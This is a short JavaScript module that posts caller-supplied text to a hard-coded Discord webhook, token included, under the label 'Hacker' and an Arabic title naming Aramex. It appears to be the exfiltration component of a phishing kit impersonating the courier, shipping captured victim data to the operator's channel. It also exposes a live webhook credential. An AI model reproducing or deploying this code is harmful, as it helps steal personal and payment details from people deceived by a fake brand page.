import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323183864687886346/5OSLR8Vqh9tHrpNxt8zGdUd17o4Ks0W1Z8Z8fCWmCGmWML2zAUbuWUGfz2muoLd5WwPT",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
